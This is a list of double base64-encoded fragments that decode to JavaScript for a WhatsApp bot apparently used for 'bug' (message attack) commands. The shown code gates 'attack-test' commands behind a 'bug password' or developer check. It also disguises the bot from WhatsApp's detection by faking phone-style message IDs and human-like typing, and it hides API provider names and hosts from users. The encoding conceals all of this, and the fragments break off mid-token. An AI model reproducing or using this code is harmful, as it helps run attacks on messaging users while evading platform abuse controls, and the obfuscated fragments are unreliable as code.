ZWE56ZDI5eVpEb2dVM1J5YVc1bktIQmhjM01nZkh3Zw==","S1NCOUtUc0tJQ0J5WlhSMWNtNGdaMlYwUW5WblVHRnpjM2R2Y21Rb2MyOWpheWs3Q24wS0x5b3FJRkpsZEhWeWJuTWdkSEoxWlNCcFppQnpaVzVrWlhJZ2JXRjVJSEoxYmlCaGRIUmhZMnN0ZEdWemRDQmpiV1J6SUNoa1pYWmxiRzl3WlhJZ1QxSWdjbVZqWlc1MElIQmhjM04zYjNKa0lFOUxLUzRnS2k4S0lDQnBaaUFvYVhORVpYWmxiRzl3WlhJb2MyOWpheXdnYlhObktTa2djbVYwZFhKdUlIUnlkV1U3Q2lBZ1kyOXVjM1FnYzJWdVpHVnlJRDBnYlhObkxtdGxlVDh1Y0dGeWRHbGphWEJoYm5RZ2ZId2diWE5uTG10bGVUOHVjbVZ0YjNSbFNtbGtJSHg4SUE9PQ==","T3dvZ0lDQWdZMjl1YzNRZ2FtbGtJRDBnYlhObkxtdGxlVDh1Y21WdGIzUmxTbWxrSUh4OElBPT0=","S1M1MGNtbHRLQ2s3Q2lBZ0lDQnBaaUFvSVhSbGVIUXBJSEpsZEhWeWJpQnVkV3hzT3dvZ0lDQWdhV1lnS0hSbGVIUWdQVDA5SUdkbGRFSjFaMUJoYzNOM2IzSmtLSE52WTJzcEtTQjdDaUFnSUNBZ0lHaHBkQzVoZFhSb1pXUWdQU0IwY25WbE93b2dJQ0FnSUNCb2FYUXVaWGh3SUQwZ1JHRjBaUzV1YjNjb0tTQXJJREV5TUY4d01EQTdJQzh2SURJZ2JXbHVJSGRwYm1SdmR5QmhablJsY2lCaGRYUm9DaUFnSUNBZ0lHSjFaMEYxZEdoUVpXNWthVzVuTG5ObGRDaHJMQ0JvYVhRcE93b2dJQ0FnSUNCeVpYUjFjbTRnZXlCaFkzUnBiMjQ2SUdocGRDNWhZM1JwYjI0c0lHRnlaM002SUdocGRDNWhjbWR6SUh4OElGdGRJSDA3Q2lBZ0lDQjlDaUFnSUNCeVpYUjFjbTRnYm5Wc2JEc0tJQ0I5SUdOaGRHTm9JSHNnY21WMGRYSnVJRzUxYkd3N0lIMEtmUW9LQ2k4cUlDMHRMUzB0TFMwdExTMGdhR2xrWlMxdGVTMWliM1E2SUcxdlltbHNaUzF6ZEhsc1pTQnRaWE56WVdkbElFbEVjeUFySUdoMWJXRnVMV3hwYTJVZ2RIbHdhVzVuSUMwdExTMHRMUzB0TFMwZ0tpOEtJQ0JqYjI1emRDQnJaWGtnUFNCVGRISnBibWNvS0hOdlkyc2dKaVlnYzI5amF5NWZYMkp2ZEU1MWJXSmxjaWtnZkh3Zw==","S1RzS0lDQmpiMjV6ZENCb2FYUWdQU0JvYVdSbFRYbERZV05vWlM1blpYUW9hMlY1S1RzS0lDQnBaaUFvYUdsMElDWW1JRVJoZEdVdWJtOTNLQ2tnTFNCb2FYUXVkSE1nUENBME1EQXdLU0J5WlhSMWNtNGdhR2wwTG1ObVp6c0tJQ0JzWlhRZ1kyWm5JRDBnZXlCbGJtRmliR1ZrT2lCMGNuVmxMQ0IwZVhCcGJtYzZJSFJ5ZFdVZ2ZUc0tJQ0IwY25rZ2V5QmpabWNnUFNCN0lDNHVMbU5tWnl3Z0xpNHVjbVZoWkVwemIyNG9jMllvYzI5amF5d2c=","S1N3Z2UzMHBJSDA3SUgwZ1kyRjBZMmdnZTMwS0lDQm9hV1JsVFhsRFlXTm9aUzV6WlhRb2EyVjVMQ0I3SUhSek9pQkVZWFJsTG01dmR5Z3BMQ0JqWm1jZ2ZTazdDaUFnY21WMGRYSnVJR05tWnpzS2ZRb2dJR052Ym5OMElHTm1aeUE5SUhzZ0xpNHVaMlYwU0dsa1pVMTVRMlpuS0hOdlkyc3BMQ0F1TGk1d1lYUmphQ0I5T3dvZ0lIUnllU0I3SUhkeWFYUmxTbk52YmloelppaHpiMk5yTENBPQ==","S1N3Z1kyWm5LVHNnZlNCallYUmphQ0I3ZlFvZ0lHaHBaR1ZOZVVOaFkyaGxMbk5sZENoVGRISnBibWNvS0hOdlkyc2dKaVlnYzI5amF5NWZYMkp2ZEU1MWJXSmxjaWtnZkh3Zw==","S1N3Z2V5QjBjem9nUkdGMFpTNXViM2NvS1N3Z1kyWm5JSDBwT3dvZ0lISmxkSFZ5YmlCalptYzdDbjBLTHlvcUlETXlMV05vWVhJZ2RYQndaWEpqWVhObElHaGxlQ0JzYVd0bElIUm9aU0J3YUc5dVpTQmhjSEJ6SUhWelpTRGlnSlFnYm1WMlpYSWdkR2hsSUVKaGFXeGxlWE1nTTBWQ01DQXZJRUpCUlRVZ2NHRjBkR1Z5Ym5NZ0tpOEtJQ0JtYjNJZ0tHeGxkQ0JwSUQwZ01Ec2dhU0E4SURVN0lHa3JLeWtnZXdvZ0lDQWdZMjl1YzNRZ2FXUWdQU0J5WVc1a2IyMUNlWFJsY3lneE5pa3VkRzlUZEhKcGJtY28=","S1M1MGIxVndjR1Z5UTJGelpTZ3BPd29nSUNBZ2FXWWdLQ0V2WGlnelJVSXdmRUpCUlRVcEx5NTBaWE4wS0dsa0tTa2djbVYwZFhKdUlHbGtPd29nSUgwS0lDQnlaWFIxY200Zw==","SUNzZ2NtRnVaRzl0UW5sMFpYTW9NVFVwTG5SdlUzUnlhVzVuS0E9PQ==","S1M1MGIxVndjR1Z5UTJGelpTZ3BJQ3Nn","T3dwOUNpQWdhV1lnS0NGemIyTnJJSHg4SUhOdlkyc3VYMTlvYVdSbFRYbENiM1JKYm5OMFlXeHNaV1FnZkh3Z2RIbHdaVzltSUhOdlkyc3VjMlZ1WkUxbGMzTmhaMlVnSVQwOUlBPT0=","S1NCeVpYUjFjbTQ3Q2lBZ2MyOWpheTVmWDJocFpHVk5lVUp2ZEVsdWMzUmhiR3hsWkNBOUlIUnlkV1U3Q2lBZ1kyOXVjM1FnYjNKcFp5QTlJSE52WTJzdWMyVnVaRTFsYzNOaFoyVXVZbWx1WkNoemIyTnJLVHNLSUNCamIyNXpkQ0JzWVhOMFUyVnVaQ0E5SUc1bGR5Qk5ZWEFvS1RzS0lDQnpiMk5yTG5ObGJtUk5aWE56WVdkbElEMGdZWE41Ym1NZ0tHcHBaQ3dnWTI5dWRHVnVkQ3dnYjNCMGFXOXVjeWtnUFQ0Z2V3b2dJQ0FnYkdWMElHOXdkSE1nUFNCdmNIUnBiMjV6T3dvZ0lDQWdkSEo1SUhzS0lDQWdJQ0FnWTI5dWMzUWdZMlpuSUQwZ1oyVjBTR2xrWlUxNVEyWm5LSE52WTJzcE93b2dJQ0FnSUNCamIyNXpkQ0JqSUQwZ1kyOXVkR1Z1ZENCOGZDQjdmVHNLSUNBZ0lDQWdZMjl1YzNRZ2MydHBjQ0E5SUNGcWFXUWdmSHdnYW1sa0lEMDlQU0E9","SUh4OElDOUFibVYzYzJ4bGRIUmxjaVF2TG5SbGMzUW9VM1J5YVc1bktHcHBaQ2twSUh4OElHTXVaR1ZzWlhSbElIeDhJR011Y21WaFkzUTdDaUFnSUNBZ0lHbG1JQ2hqWm1jdVpXNWhZbXhsWkNBbUppQWhjMnRwY0NrZ2V3b2dJQ0FnSUNBZ0lHbG1JQ2doYjNCMGN5QjhmQ0FoYjNCMGN5NXRaWE56WVdkbFNXUXBJRzl3ZEhNZ1BTQjdJQzR1TGlodmNIUnpJSHg4SUh0OUtTd2diV1Z6YzJGblpVbGtPaUJ0YjJKcGJHVlRkSGxzWlUxbGMzTmhaMlZKWkNncElIMDdDaUFnSUNBZ0lDQWdZMjl1YzNRZ2RHVjRkSFZoYkNBOUlDRmpMbVZrYVhRZ0ppWWdLR011ZEdWNGRDQWhQU0J1ZFd4c0lIeDhJR011WTJGd2RHbHZiaUFoUFNCdWRXeHNJSHg4SUdNdWFXMWhaMlVnZkh3Z1l5NTJhV1JsYnlCOGZDQmpMbUYxWkdsdklIeDhJR011YzNScFkydGxjaUI4ZkNCakxtUnZZM1Z0Wlc1MEtUc0tJQ0FnSUNBZ0lDQnBaaUFvWTJabkxuUjVjR2x1WnlBbUppQjBaWGgwZFdGc0lDWW1JSFI1Y0dWdlppQnpiMk5yTG5ObGJtUlFjbVZ6Wlc1alpWVndaR0YwWlNBOVBUMGc=","S1NCN0NpQWdJQ0FnSUNBZ0lDQmpiMjV6ZENCdWIzY2dQU0JFWVhSbExtNXZkeWdwT3dvZ0lDQWdJQ0FnSUNBZ2FXWWdLRzV2ZHlBdElDaHNZWE4wVTJWdVpDNW5aWFFvYW1sa0tTQjhmQ0F3S1NBK0lESTFNREFwSUhzZ0x5OGdibVYyWlhJZ2MyeHZkeUJrYjNkdUlHSjFjbk4wY3dvZ0lDQWdJQ0FnSUNBZ0lDQmpiMjV6ZENCc1pXNGdQU0JUZEhKcGJtY29ZeTUwWlhoMElIeDhJR011WTJGd2RHbHZiaUI4ZkNBPQ==","S1M1c1pXNW5kR2c3Q2lBZ0lDQWdJQ0FnSUNBZ0lHTnZibk4wSUhkaGFYUWdQU0ExTURBZ0t5Qk5ZWFJvTG1ac2IyOXlLRTFoZEdndWNtRnVaRzl0S0NrZ0tpQTVNREFwSUNzZ1RXRjBhQzV0YVc0b01USXdNQ3dnYkdWdUlDb2dPQ2s3Q2lBZ0lDQWdJQ0FnSUNBZ0lIUnllU0I3SUdGM1lXbDBJSE52WTJzdWMyVnVaRkJ5WlhObGJtTmxWWEJrWVhSbEtBPT0=","TENCcWFXUXBPeUI5SUdOaGRHTm9JSHQ5Q2lBZ0lDQWdJQ0FnSUNBZ0lHRjNZV2wwSUdSbGJHRjVLSGRoYVhRcE93b2dJQ0FnSUNBZ0lDQWdJQ0IwY25rZ2V5QmhkMkZwZENCemIyTnJMbk5sYm1SUWNtVnpaVzVqWlZWd1pHRjBaU2c9","TENCcWFXUXBPeUI5SUdOaGRHTm9JSHQ5Q2lBZ0lDQWdJQ0FnSUNCOUNpQWdJQ0FnSUNBZ0lDQnNZWE4wVTJWdVpDNXpaWFFvYW1sa0xDQkVZWFJsTG01dmR5Z3BLVHNLSUNBZ0lDQWdJQ0FnSUdsbUlDaHNZWE4wVTJWdVpDNXphWHBsSUQ0Z01qQXdLU0JzWVhOMFUyVnVaQzVrWld4bGRHVW9iR0Z6ZEZObGJtUXVhMlY1Y3lncExtNWxlSFFvS1M1MllXeDFaU2s3Q2lBZ0lDQWdJQ0FnZlFvZ0lDQWdJQ0I5Q2lBZ0lDQjlJR05oZEdOb0lIdDlDaUFnSUNCeVpYUjFjbTRnYjNKcFp5aHFhV1FzSUdOdmJuUmxiblFzSUc5d2RITXBPd29nSUgwN0NuMEtDaThxSUMwdExTMHRMUzB0TFMwZ2QyaHZhWE1nYUdWc2NHVnljeUF0TFMwdExTMHRMUzB0SUNvdkNpQWc=","Q24wN0NpQWdZMjl1YzNRZ2N5QTlJRk4wY21sdVp5aHVJSHg4SUE9PQ==","S1RzS0lDQm1iM0lnS0dOdmJuTjBJR3hsYmlCdlppQmJNeXdnTWl3Z01WMHBJSHNnWTI5dWMzUWdZeUE5SUZoVVgwTlBWVTVVVWxsZlEwOUVSVk5iY3k1emJHbGpaU2d3TENCc1pXNHBYVHNnYVdZZ0tHTXBJSEpsZEhWeWJpQmpPeUI5Q2lBZ2NtVjBkWEp1SUE9PQ==","T3dwOUNnb3ZLaW9LSUNvZ1RXOWtaU0IwYjJkbmJHVWdjR0Z5YzJWeU9pQT0=","SUM4Zw==","TGdvZ0tpQT0=","SUc5dWJIa2djM2RwZEdOb1pYTWdiMlptSUhkb1pXNGdkR2hoZENCdGIyUmxJR2x6SUhSb1pTQmhZM1JwZG1VZ2IyNWxMaUJTWlhSMWNtNXpJRzUxYkd3Z1ptOXlJRzV2TDNWdWEyNXZkMjRnWVhKbmN5NEtJQ29nNG9hU0lIc2diVzlrWlRvZw==","TENCdWIzUmxPaUJ6ZEhKcGJtY2dmUW9nS2k4S0lDQmpiMjV6ZENCaE1DQTlJRk4wY21sdVp5aGhjbWR6V3pCZElIeDhJQT09","S1M1MGIweHZkMlZ5UTJGelpTZ3BPd29nSUdOdmJuTjBJR0V4SUQwZ1UzUnlhVzVuS0dGeVozTmJNVjBnZkh3Zw==","S1M1MGIweHZkMlZ5UTJGelpTZ3BPd29nSUdsbUlDZ2hZVEFwSUhKbGRIVnliaUJ1ZFd4c093b2dJR2xtSUNoaE1DQTlQVDBn","S1NCeVpYUjFjbTRnZXlCdGIyUmxPaUE9","TENCdWIzUmxPaUE9","SUgwN0NpQWdhV1lnS0dFd0lEMDlQU0E9","S1NCeVpYUjFjbTRnZXlCdGIyUmxPaUJ2YmsxdlpHVXNJRzV2ZEdVNklBPT0=","SUgwN0NpQWdhV1lnS0ZzPQ==","WFM1cGJtTnNkV1JsY3loaE1Da3BJSHNLSUNBZ0lHbG1JQ2hoTVNBOVBUMGc=","S1NCN0NpQWdJQ0FnSUdsbUlDZ29ZM1Z5Y21WdWRDQjhmQ0E9","S1NBOVBUMGdZVEFwSUhKbGRIVnliaUI3SUcxdlpHVTZJQT09","SUgwN0NpQWdJQ0FnSUhKbGRIVnliaUI3SUcxdlpHVTZJR04xY25KbGJuUWdmSHdn","ZlNvcElPS0FsQ0J1YjNSb2FXNW5JR05vWVc1blpXUXVZQ0I5T3dvZ0lDQWdmUW9nSUNBZ2FXWWdLQ0ZoTVNCOGZDQmhNU0E5UFQwZw==","S1NCeVpYUjFjbTRnZXlCdGIyUmxPaUJoTUN3Z2JtOTBaVG9n","SUgwN0NpQWdmUW9nSUhKbGRIVnliaUJ1ZFd4c093cDlDZ292S2lvZ1VHRnljMlVnWkdWc1lYa2djM1J5YVc1bklHeHBhMlVnSXpVd01HMXpMQ0FqTVhObFl5d2dJekp6TENBak1XMXBiaXdnSXpWdExDQWpNV2dzSUNNM01tZ2dJT0tHa2lCdGN5QW9iV2x1SURVd01Dd2diV0Y0SURjeUlHaHZkWEp6S1NBcUx3b2dJR2xtSUNnaGMzUnlJSHg4SUNGemRISXVjM1JoY25SelYybDBhQ2c9","S1NrZ2NtVjBkWEp1SUhzZ1pHVnNZWGs2SURBc0lHOXJPaUIwY25WbElIMDdDaUFnWTI5dWMzUWdaR1ZzWVhsVGRISWdQU0J6ZEhJdWMyeHBZMlVvTVNrdWRHOU1iM2RsY2tOaGMyVW9LVHNLSUNCc1pYUWdaR1ZzWVhrZ1BTQXdPd29nSUdsbUlDaGtaV3hoZVZOMGNpNWxibVJ6VjJsMGFDZz0=","S1NrZ1pHVnNZWGtnUFNCd1lYSnpaVWx1ZENoa1pXeGhlVk4wY2lrN0NpQWdaV3h6WlNCcFppQW9aR1ZzWVhsVGRISXVaVzVrYzFkcGRHZ28=","S1NCOGZDQmtaV3hoZVZOMGNpNWxibVJ6VjJsMGFDZz0=","S1NrZ1pHVnNZWGtnUFNCd1lYSnpaVWx1ZENoa1pXeGhlVk4wY2lrZ0tpQXhNREF3T3dvZ0lHVnNjMlVnYVdZZ0tHUmxiR0Y1VTNSeUxtVnVaSE5YYVhSb0tBPT0=","S1NrZ1pHVnNZWGtnUFNCd1lYSnpaVWx1ZENoa1pXeGhlVk4wY2lrZ0tpQTJNQ0FxSURFd01EQTdDaUFnWld4elpTQnBaaUFvWkdWc1lYbFRkSEl1Wlc1a2MxZHBkR2dv","S1NrZ1pHVnNZWGtnUFNCd1lYSnpaVWx1ZENoa1pXeGhlVk4wY2lrZ0tpQTJNQ0FxSURZd0lDb2dNVEF3TURzS0lDQmxiSE5sSUhKbGRIVnliaUI3SUdSbGJHRjVPaUF3TENCdmF6b2dabUZzYzJVc0lHVnljbTl5T2lBPQ==","SUgwN0Nnb2dJR2xtSUNocGMwNWhUaWhrWld4aGVTa2dmSHdnWkdWc1lYa2dQQ0F3S1NCeVpYUjFjbTRnZXlCa1pXeGhlVG9nTUN3Z2IyczZJR1poYkhObExDQmxjbkp2Y2pvZw==","SUgwN0NpQWdhV1lnS0dSbGJHRjVJRDRnTUNBbUppQmtaV3hoZVNBOElEVXdNQ2tnY21WMGRYSnVJSHNnWkdWc1lYazZJREFzSUc5ck9pQm1ZV3h6WlN3Z1pYSnliM0k2SUE9PQ==","SUgwN0NpQWdhV1lnS0dSbGJHRjVJRDRnTnpJZ0tpQTJNQ0FxSURZd0lDb2dNVEF3TUNrZ2NtVjBkWEp1SUhzZ1pHVnNZWGs2SURBc0lHOXJPaUJtWVd4elpTd2daWEp5YjNJNklBPT0=","SUgwN0NpQWdjbVYwZFhKdUlIc2daR1ZzWVhrc0lHOXJPaUIwY25WbElIMDdDbjBLQ2k4cUtpQkVaV3hoZVNCd1lYSnpaWElnWm05eUlDNWliMjBnWm1GdGFXeDVJT0tBbENCaGJHeHZkM01nZFhBZ2RHOGdNU0JvYjNWeUlDb3ZDaUFnYVdZZ0tDRnpkSElnZkh3Z0lYTjBjaTV6ZEdGeWRITlhhWFJvS0E9PQ==","SUgwN0NpQWdMeThnUVd4c2IzY2dNQ0FvYm04Z1pHVnNZWGtnTHlCdFlYZ2dabXh2ZHlrdUlGTnZablFnWm14dmIzSWdiMjVzZVNCM2FHVnVJSFZ6WlhJZ2MyVjBjeUJoSUhCdmMybDBhWFpsSUhaaGJIVmxJR0psYkc5M0lERXdNRzF6TGdvZ0lHbG1JQ2hrWld4aGVTQStJREFnSmlZZ1pHVnNZWGtnUENBeE1EQXBJSEpsZEhWeWJpQjdJR1JsYkdGNU9pQXdMQ0J2YXpvZ1ptRnNjMlVzSUdWeWNtOXlPaUE9","SUgwN0NpQWdhV1lnS0dSbGJHRjVJRDRnTmpBZ0tpQTJNQ0FxSURFd01EQXBJSEpsZEhWeWJpQjdJR1JsYkdGNU9pQXdMQ0J2YXpvZ1ptRnNjMlVzSUdWeWNtOXlPaUE9","SUgwN0NpQWdjbVYwZFhKdUlIc2daR1ZzWVhrc0lHOXJPaUIwY25WbElIMDdDbjBLQ2lBZ1kyOXVjM1FnWXlBOUlHZGxkRU52Ym5SbGVIUW9iWE5uS1RzS0lDQmpiMjV6ZENCdmRYUWdQU0JiWFRzS0lDQnBaaUFvWXk1d1lYSjBhV05wY0dGdWRDa2diM1YwTG5CMWMyZ29ibTl5YldGc2FYcGxTbWxrS0dNdWNHRnlkR2xqYVhCaGJuUXBLVHNLSUNCcFppQW9RWEp5WVhrdWFYTkJjbkpoZVNoakxtMWxiblJwYjI1bFpFcHBaQ2twSUc5MWRDNXdkWE5vS0M0dUxtTXViV1Z1ZEdsdmJtVmtTbWxrTG0xaGNDaHViM0p0WVd4cGVtVkthV1FwS1RzS0lDQm1iM0lnS0dOdmJuTjBJR0VnYjJZZ1lYSm5jeWtnZXdvZ0lDQWdZMjl1YzNRZ2JpQTlJRk4wY21sdVp5aGhLUzV5WlhCc1lXTmxLQzljUkM5bkxDQT0=","SUh4OElIQXVZV1J0YVc0Z1BUMDlJQT09","S1RzS2ZRb2dJSEpsZEhWeWJpQnViM0p0WVd4cGVtVkthV1FvYzI5amF5NTFjMlZ5UHk1cFpDazdDbjBLSUNCamIyNXpkQ0J1SUQwZ1UzUnlhVzVuS0hCeWIyTmxjM011Wlc1MkxrOVhUa1ZTWDA1VlRVSkZVaUI4ZkNBPQ==","S1M1eVpYQnNZV05sS0M5Y1JDOW5MQ0E9","T3dvZ0lHWnZjaUFvWTI5dWMzUWdjQ0J2WmlCdFpYUmhMbkJoY25ScFkybHdZVzUwY3lrZ2V3b2dJQ0FnWTI5dWMzUWdhV1FnUFNCd0xtbGtJSHg4SUhBdWFtbGtJSHg4SUE9PQ==","T3dvZ0lDQWdZMjl1YzNRZ2NHNGdQU0J3TG5Cb2IyNWxUblZ0WW1WeUlIeDhJSEF1Ykdsa0lIeDhJQT09","T3dwOUNnb2dJR052Ym5OMElHWnBiR1VnUFNCemIyTnJJRDhnYzJZb2MyOWpheXdn","S1NBNklITmxkSGRoY201R2FXeGxPd29nSUdOdmJuTjBJSGNnUFNCeVpXRmtTbk52YmlobWFXeGxMQ0I3SUd4cGJXbDBPaUF5SUgwcE93b2dJR052Ym5OMElHNGdQU0JPZFcxaVpYSW9keTVzYVcxcGRDazdDaUFnY21WMGRYSnVJRzRnUGowZ01TQW1KaUJ1SUR3OUlEVWdQeUJ1SURvZ01qc0tmUW9LSUNCamIyNXpkQ0J5SUQwZ1UzUnlhVzVuS0hKbFlYTnZiaUI4ZkNBPQ==","S1M1MGIweHZkMlZ5UTJGelpTZ3BMbkpsY0d4aFkyVW9MMXRlWVMxNk1DMDVYU3N2Wnl3Zw==","S1NBNklIZGhjbTVHYVd4bE93b2dJR052Ym5OMElIZGhjbTV6SUQwZ2NtVmhaRXB6YjI0b1ptbHNaU3dnZTMwcE93b2dJSEpsZEhWeWJpQk9kVzFpWlhJb2QyRnlibk5iZDJGeWJrdGxlU2huYVdRc0lHNTFiV0psY2l3Z2NtVmhjMjl1S1YwZ2ZId2dNQ2s3Q24wS0NpQWdZMjl1YzNRZ1ptbHNaU0E5SUhOdlkyc2dQeUJ6WmloemIyTnJMQ0E9","S1NBNklIZGhjbTVHYVd4bE93b2dJR052Ym5OMElIZGhjbTV6SUQwZ2NtVmhaRXB6YjI0b1ptbHNaU3dnZTMwcE93b2dJR052Ym5OMElHdGxlU0E5SUhkaGNtNUxaWGtvWjJsa0xDQnVkVzFpWlhJc0lISmxZWE52YmlrN0NpQWdkMkZ5Ym5OYmEyVjVYU0E5SUNoT2RXMWlaWElvZDJGeWJuTmJhMlY1WFNrZ2ZId2dNQ2tnS3lBeE93b2dJSGR5YVhSbFNuTnZiaWhtYVd4bExDQjNZWEp1Y3lrN0NpQWdjbVYwZFhKdUlIZGhjbTV6VzJ0bGVWMDdDbjBLQ2lBZ1kyOXVjM1FnWm1sc1pTQTlJSE52WTJzZ1B5QnpaaWh6YjJOckxDQT0=","S1NrZ1pHVnNaWFJsSUhkaGNtNXpXMnRkT3dvZ0lDQWdmUW9nSUgwS0lDQjNjbWwwWlVwemIyNG9abWxzWlN3Z2QyRnlibk1wT3dwOUNnb2dJR052Ym5OMElHWnBiR1VnUFNCemIyTnJJRDhnYzJZb2MyOWpheXdn","S1NBNklIZGhjbTVHYVd4bE93b2dJR052Ym5OMElIZGhjbTV6SUQwZ2NtVmhaRXB6YjI0b1ptbHNaU3dnZTMwcE93b2dJR3hsZENCaklEMGdNRHNLSUNCbWIzSWdLR052Ym5OMElHc2diMllnVDJKcVpXTjBMbXRsZVhNb2QyRnlibk1wS1NCN0NpQWdJQ0JwWmlBb2F5NXpkR0Z5ZEhOWGFYUm9LR2RwWkNBcklBPT0=","S1NrZ2V5QmtaV3hsZEdVZ2QyRnlibk5iYTEwN0lHTXJLenNnZlFvZ0lIMEtJQ0IzY21sMFpVcHpiMjRvWm1sc1pTd2dkMkZ5Ym5NcE93b2dJSEpsZEhWeWJpQmpPd3A5Q2dvZ0lHTnZibk4wSUdacGJHVWdQU0J6YjJOcklEOGdjMllvYzI5amF5d2c=","S1NBL0lIVnVkM0poY0UxbGMzTmhaMlVvYlNrZ09pQnRPd29nSUdsbUlDaHBibTVsY2k1emRHbGphMlZ5VFdWemMyRm5aU0I4ZkNCdExuTjBhV05yWlhKTlpYTnpZV2RsS1NCeVpYUjFjbTRn","T3dvZ0lHbG1JQ2hwYm01bGNpNTJhV1JsYjAxbGMzTmhaMlVnZkh3Z2JTNTJhV1JsYjAxbGMzTmhaMlVnZkh3Z2JTNTJhV1YzVDI1alpVMWxjM05oWjJWV01qOHViV1Z6YzJGblpUOHVkbWxrWlc5TlpYTnpZV2RsS1NCeVpYUjFjbTRn","T3dvZ0lHbG1JQ2hwYm01bGNpNXBiV0ZuWlUxbGMzTmhaMlVnZkh3Z2JTNXBiV0ZuWlUxbGMzTmhaMlVnZkh3Z2JTNTJhV1YzVDI1alpVMWxjM05oWjJWV01qOHViV1Z6YzJGblpUOHVhVzFoWjJWTlpYTnpZV2RsS1NCeVpYUjFjbTRn","T3dvZ0lHbG1JQ2hwYm01bGNpNWhkV1JwYjAxbGMzTmhaMlVnZkh3Z2JTNWhkV1JwYjAxbGMzTmhaMlVwSUhKbGRIVnliaUE9","T3dvZ0lHTnZibk4wSUhSbGVIUWdQU0FvQ2lBZ0lDQnRMbU52Ym5abGNuTmhkR2x2YmlCOGZBb2dJQ0FnYlM1bGVIUmxibVJsWkZSbGVIUk5aWE56WVdkbFB5NTBaWGgwSUh4OENpQWdJQ0JwYm01bGNpNWpiMjUyWlhKellYUnBiMjRnZkh3S0lDQWdJR2x1Ym1WeUxtVjRkR1Z1WkdWa1ZHVjRkRTFsYzNOaFoyVS9MblJsZUhRZ2ZId0tJQ0FnSUE9PQ==","Q2lBZ0tUc0tJQ0JwWmlBb0wyaDBkSEJ6UHpwY0wxd3ZYRk1yZkdOb1lYUmNMbmRvWVhSellYQndYQzVqYjIxY0wxeFRLM3gzZDNkY0xsdGVYSE5kS3k5cExuUmxjM1FvZEdWNGRDa3BJSEpsZEhWeWJpQT0=","T3dvZ0lHbG1JQ2gwWlhoMElDWW1JRk4wY21sdVp5aDBaWGgwS1M1MGNtbHRLQ2twSUhKbGRIVnliaUE9","T3dvZ0lDOHZJR1poYkd4aVlXTnJJR0o1SUcxbGMzTmhaMlVnYTJWNWN3b2dJR052Ym5OMElHdGxlWE1nUFNCUFltcGxZM1F1YTJWNWN5aHRJSHg4SUh0OUtUc0tJQ0JwWmlBb2EyVjVjeTV6YjIxbEtHc2dQVDRnTDNOMGFXTnJaWEl2YVM1MFpYTjBLR3NwS1NrZ2NtVjBkWEp1SUE9PQ==","T3dvZ0lHbG1JQ2hyWlhsekxuTnZiV1VvYXlBOVBpQXZkbWxrWlc4dmFTNTBaWE4wS0dzcEtTa2djbVYwZFhKdUlBPT0=","T3dvZ0lHbG1JQ2hyWlhsekxuTnZiV1VvYXlBOVBpQXZhVzFoWjJVdmFTNTBaWE4wS0dzcEtTa2djbVYwZFhKdUlBPT0=","T3dvZ0lHbG1JQ2hyWlhsekxuTnZiV1VvYXlBOVBpQXZZWFZrYVc4dmFTNTBaWE4wS0dzcEtTa2djbVYwZFhKdUlBPT0=","T3dwOUNnb3ZLaW9nU0dsa1pTQkJVRWtnTHlCd2NtOTJhV1JsY2lCdVlXMWxjeXdnYUc5emRITWdZVzVrSUZWU1RITWdabkp2YlNCMWMyVnlMV1poWTJsdVp5QjBaWGgwSUNvdkNpOHFLaUJNYVdkb2RDQnpZM0oxWWlEaWdKUWdjMkZtWlNCbWIzSWdRVTVaSUc5MWRHZHZhVzVuSUhSbGVIUWdLRzVsZG1WeUlIUnZkV05vWlhNZ2JtOXliV0ZzSUhkdmNtUnpLU0FxTHdvZ0lHbG1JQ2gwZVhCbGIyWWdkQ0FoUFQwZw==","SUh4OElDRjBLU0J5WlhSMWNtNGdkRHNLSUNCeVpYUjFjbTRnZEFvZ0lDQWdMbkpsY0d4aFkyVW9VRkpQVmtsRVJWSmZWVkpNWDFKRkxDQT0=","S1FvZ0lDQWdMbkpsY0d4aFkyVW9VRkpQVmtsRVJWSmZTRTlUVkY5U1JTd2c=","S1FvZ0lDQWdMbkpsY0d4aFkyVW9MMXhpS0ZOMWNISmxiV1Y4UTNsd2FHVnlmRWhsWTNSdmNrMWhiblZsYkh4SVpXTjBiM0o4UzJWcGRHaDhSV3hwZEdVcFhITXJRVkJKWEdJdmFXY3NJQT09","S1FvZ0lDQWdMbkpsY0d4aFkyVW9MM2R2YkdaemIyTnJaWFF2YVdjc0lBPT0=","S1RzS2ZRb3ZLaW9nVTNSeWIyNW5JSE5qY25WaUlPS0FsQ0JtYjNJZ1pYSnliM0lnYldWemMyRm5aWE1nYjI1c2VTQXFMd29nSUd4bGRDQmpJRDBnYzJOeWRXSlVaWGgwS0ZOMGNtbHVaeWhsUHk1dFpYTnpZV2RsSUh4OElHVWdmSHdn","S1NrN0NpQWdZeUE5SUdNdWNtVndiR0ZqWlNndlhHSW9aMlYwWVdSa2NtbHVabTk4UlVOUFRrNWNkeXA4UlU1UFZFWlBWVTVFZkVWVVNVMUZSRTlWVkh4RlFVbGZRVWRCU1U1OFJVaFBVMVJWVGxKRlFVTklmSE52WTJ0bGRDQm9ZVzVuSUhWd0tWeGlXMTVjYmwwcUwybG5MQ0E9","S1RzS0lDQmpJRDBnWXk1eVpYQnNZV05sS0M5Y1lpaGhjR2x6YzNWd2NtVnRaWHh6ZFhCeVpXMWxmR041Y0dobGNuaGliM1I4WTNsd2FHVnlmR2hsWTNSdmNtMWhiblZsYkh4bGJHbDBaWEJ5YjNSbFkyaDhhMlZwZEdncFhHSXZhV2NzSUE9PQ==","S1RzS0lDQnlaWFIxY200Z1l5NXNaVzVuZEdnZ1BpQXpNREFnUHlCakxuTnNhV05sS0RBc0lETXdNQ2tnS3lBPQ==","SURvZ1l6c0tmUW9LTHlvcUlFUmxkR1ZqZENCaElHWnZjbmRoY21SbFpDQmphR0Z1Ym1Wc0lDaHVaWGR6YkdWMGRHVnlLU0J3YjNOMElDOGdZMmhoYm01bGJDQnBiblpwZEdVZ1kyRnlaQ0F2SUdOb1lXNXVaV3dnYkdsdWF5QnBibk5wWkdVZ1lTQnRaWE56WVdkbElDb3ZDaUFnZEhKNUlIc0tJQ0FnSUdOdmJuTjBJRzBnUFNCdGMyYy9MbTFsYzNOaFoyVTdDaUFnSUNCcFppQW9JVzBwSUhKbGRIVnliaUJtWVd4elpUc0tJQ0FnSUdOdmJuTjBJSE5sWlc0Z1BTQnVaWGNnVTJWMEtDazdDaUFnSUNCamIyNXpkQ0IzWVd4cklEMGdLRzhzSUdRcElEMCtJSHNLSUNBZ0lDQWdhV1lnS0NGdklIeDhJSFI1Y0dWdlppQnZJQ0U5UFNBPQ==","SUh4OElHUWdQaUEzSUh4OElITmxaVzR1YUdGektHOHBLU0J5WlhSMWNtNGdabUZzYzJVN0NpQWdJQ0F